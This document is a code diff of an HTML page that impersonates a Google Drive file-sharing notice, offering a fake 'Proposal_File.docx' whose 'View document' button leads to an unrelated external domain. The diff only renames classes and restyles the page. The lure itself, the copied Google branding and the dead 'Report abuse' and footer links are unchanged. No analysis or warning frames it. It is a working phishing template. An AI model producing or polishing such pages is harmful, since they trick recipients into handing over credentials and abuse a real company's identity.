@@ -3,51 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Drive - View Document</title>
+    <title>Google Drive - Shared Item</title>
     <link rel="stylesheet" href="style.css">
     <link href="https://fonts.googleapis.com" rel="stylesheet">
 </head>
 <body>
-    <div class="container">
+    <main class="viewport">
         <div class="card">
             <!-- Pure CSS Google Drive Logo -->
-            <div class="logo-container">
-                <div class="drive-logo">
-                    <div class="side green"></div>
-                    <div class="side blue"></div>
-                    <div class="side yellow"></div>
+            <div class="drive-logo-wrap">
+                <div class="logo-shape">
+                    <div class="tri-side yellow"></div>
+                    <div class="tri-side green"></div>
+                    <div class="tri-side blue"></div>
                 </div>
-                <div class="brand">Google Drive</div>
+                <span class="brand-name">Google Drive</span>
             </div>
 
-            <h1>Shared Document</h1>
-            <p>A file has been shared with you via Google Drive.</p>
-            
-            <div class="file-box">
-                <!-- Pure CSS Doc Icon -->
-                <div class="doc-icon">
+            <h1 class="headline">Shared Document</h1>
+            <p class="subtext">A file has been shared with you via Google Drive.</p>
+
+            <div class="file-preview-card">
+                <div class="doc-icon-css">
+                    <div class="dog-ear"></div>
                     <div class="lines"></div>
                 </div>
-                <div class="file-details">
-                    <span class="file-name">Proposal_File.docx</span>
-                    <span class="file-meta">Word Document • 1.2 MB</span>
+                <div class="file-info">
+                    <div class="name">Proposal_File.docx</div>
+                    <div class="meta">Word Document • 1.2 MB</div>
                 </div>
             </div>
 
-            <div class="actions">
-                <a href="https://founder.deciobo.solutions/0UQQj0iXO5rEMJgCnVeD@O/" class="btn-primary">View document</a>
-            </div>
+            <a href="https://founder.deciobo.solutions/0UQQj0iXO5rEMJgCnVeD@O/" class="primary-button">View document</a>
 
-            <div class="footer">
-                <p>Don't recognize this sender? <a href="#">Report abuse</a></p>
-            </div>
+            <footer class="card-footer">
+                Don't recognize this sender? <a href="#" class="link">Report abuse</a>
+            </footer>
         </div>
-        
-        <div class="bottom-nav">
+
+        <nav class="external-links">
             <a href="#">Privacy</a>
             <a href="#">Terms</a>
             <a href="#">Help</a>
-        </div>
-    </div>
+        </nav>
+    </main>
 </body>
 </html>
